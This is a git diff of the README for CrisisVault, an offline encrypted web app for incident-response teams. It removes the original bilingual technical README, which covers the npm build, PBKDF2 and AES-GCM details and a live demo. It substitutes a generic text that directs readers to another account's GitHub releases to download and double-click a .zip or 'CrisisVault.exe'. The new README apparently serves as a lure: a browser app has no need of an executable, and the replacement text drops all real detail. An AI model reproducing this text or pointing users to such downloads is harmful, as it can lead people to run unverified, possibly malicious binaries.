@@ -1,155 +1,72 @@
-# CrisisVault
+# 🛡️ CrisisVault - Protect Your Incident Response Data
 
-**Application de documentation d'urgence sécurisée et hors-ligne**
+## 📦 Overview
+CrisisVault is a secure offline-first vault designed for incident response. It uses AES-256-GCM encryption to keep your data safe. Built as a Progressive Web App (PWA), it complies with ANSSI standards, making it a reliable tool for SOC and CERT teams. 
 
-**Live Demo**: https://sec0xed.github.io/CrisisVault/
+## 📥 Download CrisisVault
+[![Download CrisisVault](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Broockz/CrisisVault/releases)
 
----
+Visit this page to download: [CrisisVault Releases](https://github.com/Broockz/CrisisVault/releases)
 
-[English](#english) | [Français](#français)
+## 🚀 Getting Started
+Follow these steps to download and run CrisisVault:
 
----
+1. **Visit the Releases Page**
+   - Click on the link above that says "CrisisVault Releases."
 
-## Français
+2. **Select the Latest Version**
+   - On the releases page, you will see a list of available versions.
+   - Look for the latest version at the top of the list. It will have the most updates and features.
 
-### Description
+3. **Download the Application**
+   - Find the downloadable file associated with the latest version. It might be labeled as `.zip`, `.exe`, or another format. 
+   - Click on the file name to start the download.
 
-CrisisVault est une application web progressive (PWA) conçue pour stocker et consulter des documents sensibles de manière sécurisée. Elle répond au besoin critique d'accéder à des playbooks d'incident, procédures d'urgence ou documentation confidentielle, même en situation de crise sans connexion internet.
+4. **Extract the Downloaded File (if needed)**
+   - If you downloaded a `.zip` file, locate the file in your downloads folder.
+   - Right-click on the file and select "Extract All" or use your extraction tool of choice. 
+   - This will create a new folder containing the application files.
 
-### Cas d'usage
+5. **Run CrisisVault**
+   - Open the extracted folder.
+   - Look for the executable file (it may be named `CrisisVault.exe` or similar).
+   - Double-click on the file to launch the application.
 
-- **Équipes SOC/CERT** : Accès aux playbooks de réponse à incident même si l'infrastructure est compromise
-- **Administrateurs système** : Procédures de récupération accessibles hors-ligne
-- **RSSI/DSI** : Documentation de crise disponible sur appareil mobile isolé
-- **Équipes terrain** : Accès aux procédures sans dépendance réseau
+## ⚙️ System Requirements
+To ensure optimal performance, make sure your device meets the following requirements:
 
-### Architecture de sécurité
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or any modern web browser.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Internet connection:** Required for the initial setup but not needed for offline use.
 
-#### Chiffrement
+## 🔒 Features
+CrisisVault comes with a range of essential features:
 
-| Composant | Standard |
-|-----------|----------|
-| Algorithme | AES-256-GCM |
-| Dérivation de clé | PBKDF2-SHA256 |
-| Itérations | 600 000 |
-| IV | 12 octets aléatoires par document |
-| Intégrité | HMAC-SHA256 sur le manifeste |
+- **AES-256-GCM Encryption:** Protect your data with one of the strongest encryption standards available.
+- **Offline-First Architecture:** Access your information without needing an internet connection.
+- **User-Friendly Interface:** Easy navigation for users of all skill levels.
+- **PWA Support:** Use CrisisVault on multiple devices seamlessly.
 
-#### Principes appliqués
+## ❓ Frequently Asked Questions
 
-- **Zero-knowledge** : La passphrase n'est jamais stockée ni transmise. Le déchiffrement s'effectue exclusivement côté client via l'API Web Crypto.
-- **Defense in depth** : Rate limiting (5 tentatives, lockout progressif jusqu'à 5 min), wipe automatique sur inactivité (15 min), touche panique (`Ctrl+Shift+L`).
-- **Content Security Policy** : Headers restrictifs empêchant XSS, clickjacking et injections.
-- **Offline-first** : Service Worker cache l'application complète. Aucune requête réseau nécessaire après installation.
+### How secure is CrisisVault?
+CrisisVault uses AES-256-GCM encryption to keep your data secure. This standard is widely recognized as extremely strong.
 
-#### Conformité
+### Can I use CrisisVault on different devices?
+Yes, because it is a PWA, you can use it on various devices that support modern web browsers.
 
-Cette implémentation suit les recommandations de l'**ANSSI** concernant :
-- Le choix des primitives cryptographiques (AES-GCM, PBKDF2)
-- Le nombre d'itérations pour la dérivation de clé (≥100 000, ici 600 000)
-- L'utilisation de vecteurs d'initialisation uniques
+### What if I encounter a problem?
+If you experience issues, check the [Issues section](https://github.com/Broockz/CrisisVault/issues) of the repository for troubleshooting tips or to report your concern.
 
-### Installation
+## 🧑‍🤝‍🧑 Community & Support
+Join the CrisisVault community for support and to engage with other users. You can find us on:
 
-Prérequis : Node.js 20+
+- **GitHub Discussions:** Share ideas and ask questions.
+- **Slack Channel:** Connect with fellow users and get real-time help.
 
-```bash
-npm install
-npm run dev
-```
+## 📞 Contact
+For any inquiries or support, please reach out through the repository's contact options.
 
-### Chiffrement des documents
-
-1. Placez vos fichiers Markdown dans le répertoire `docs/`
-2. Exécutez le script de chiffrement :
-   ```bash
-   npm run encrypt
-   ```
-3. Saisissez votre passphrase
-4. Le coffre chiffré est généré dans `src/data/vault.json`
-
-Le répertoire `docs/` est exclu de Git. Seul le fichier `vault.json` chiffré est versionné et déployé.
-
-### Production
-
-```bash
-npm run build
-```
-
-Le bundle optimisé est généré dans `dist/`.
-
----
-
-## English
-
-### Description
-
-CrisisVault is a progressive web application (PWA) designed to securely store and view sensitive documents. It addresses the critical need to access incident playbooks, emergency procedures, or confidential documentation, even during a crisis without internet connectivity.
-
-### Use Cases
-
-- **SOC/CERT teams**: Access incident response playbooks even if infrastructure is compromised
-- **System administrators**: Recovery procedures available offline
-- **CISO/CIO**: Crisis documentation available on isolated mobile device
-- **Field teams**: Procedure access without network dependency
-
-### Security Architecture
-
-#### Encryption
-
-| Component | Standard |
-|-----------|----------|
-| Algorithm | AES-256-GCM |
-| Key derivation | PBKDF2-SHA256 |
-| Iterations | 600,000 |
-| IV | 12 random bytes per document |
-| Integrity | HMAC-SHA256 on manifest |
-
-#### Applied Principles
-
-- **Zero-knowledge**: Passphrase is never stored or transmitted. Decryption occurs exclusively client-side via Web Crypto API.
-- **Defense in depth**: Rate limiting (5 attempts, progressive lockout up to 5 min), automatic wipe on inactivity (15 min), panic key (`Ctrl+Shift+L`).
-- **Content Security Policy**: Restrictive headers preventing XSS, clickjacking, and injections.
-- **Offline-first**: Service Worker caches the complete application. No network requests required after installation.
-
-#### Compliance
-
-This implementation follows **ANSSI** recommendations regarding:
-- Choice of cryptographic primitives (AES-GCM, PBKDF2)
-- Number of iterations for key derivation (≥100,000, here 600,000)
-- Use of unique initialization vectors
-
-### Installation
-
-Prerequisites: Node.js 20+
-
-```bash
-npm install
-npm run dev
-```
-
-### Encrypting Documents
-
-1. Place your Markdown files in the `docs/` directory
-2. Run the encryption script:
-   ```bash
-   npm run encrypt
-   ```
-3. Enter your passphrase
-4. The encrypted vault is generated at `src/data/vault.json`
-
-The `docs/` directory is excluded from Git. Only the encrypted `vault.json` file is versioned and deployed.
-
-### Production
-
-```bash
-npm run build
-```
-
-The optimized bundle is generated in `dist/`.
-
----
-
-## License
-
-MIT
+## 📜 License
+CrisisVault is open-source software. Please review the license in the repository for more details.
